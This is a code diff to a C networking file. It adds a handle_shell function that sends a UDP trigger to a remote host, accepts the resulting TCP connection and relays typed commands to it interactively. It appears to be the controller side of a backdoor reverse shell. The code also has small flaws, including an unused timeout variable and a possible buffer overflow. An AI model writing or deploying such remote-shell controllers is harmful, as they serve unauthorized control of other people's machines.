@@ -3,6 +3,8 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
+#include <bs_config.h>
+#include <sys/time.h>
 
 #define handle_error(msg) \
     perror(msg); \
@@ -68,4 +70,64 @@ int send_udp(int socku, struct sockaddr_in* sa, char* data, int len)
 char* get_ip(struct sockaddr_in sa)
 {
     return inet_ntoa(sa.sin_addr);
+}
+
+
+int handle_shell(struct sockaddr_in sa, int sockfd_u, char shll){
+    char ip[INET_ADDRSTRLEN];
+    int sockfd_tc;
+    struct sockaddr_in tsa;
+    int client_fd;
+    int junk = 16;
+    int response;
+    char buf[2048];
+    inet_ntop(AF_INET, &(sa.sin_addr), ip, INET_ADDRSTRLEN);
+
+    // Print the IP address and port number
+    printf("IP Address: %s\n", ip);
+
+
+    printf("Port: %d\n", ntohs(sa.sin_port));
+    update_sockaddr_in(&tsa, AF_INET, TCP_PORT, NULL);
+    create_tcp_socket(&sockfd_tc);
+    bind_socket(sockfd_tc, &tsa);
+    struct timeval timeout;
+    timeout.tv_sec = 4;
+    timeout.tv_usec = 0;
+    if (setsockopt(sockfd_u, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
+        perror("setsockopt");
+        DBGLG("Could not set appropriate timeout\n");
+        exit(EXIT_FAILURE); 
+    }
+    if (setsockopt(sockfd_u, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
+        perror("setsockopt");
+        DBGLG("Could not set appropriate timeout\n");
+        exit(EXIT_FAILURE); 
+    }
+    listen_on_socket(sockfd_tc, 1);
+    send_udp(sockfd_u, &sa, &shll, 1);
+    DBGLG("We sent the welcome udp\n");
+    if (((client_fd = accept(sockfd_tc, (struct sockaddr*) &sa, &junk)) < 0)){
+        perror("failed to accept tcp: ");
+        return -1;
+    }
+    sleep(1);
+    DBGLG("Waiting for the responce\n");
+    while ((response = recv(client_fd, buf, sizeof(buf), 0)) > 0) {
+        fd_set read_fds;
+        FD_ZERO(&read_fds);
+        FD_SET(client_fd, &read_fds);
+        struct timeval timeout1;
+        timeout.tv_sec = 0; // Timeout in seconds
+        timeout.tv_usec = 1000;
+        buf[response] = '\0';
+        printf("%s", buf);
+        fgets(buf, sizeof(buf), stdin);
+        if (send(client_fd, buf, strlen(buf), 0) <= 0){
+            break;
+        }
+    }
+    close(client_fd);
+    close(sockfd_tc);
+    return 0;
 }
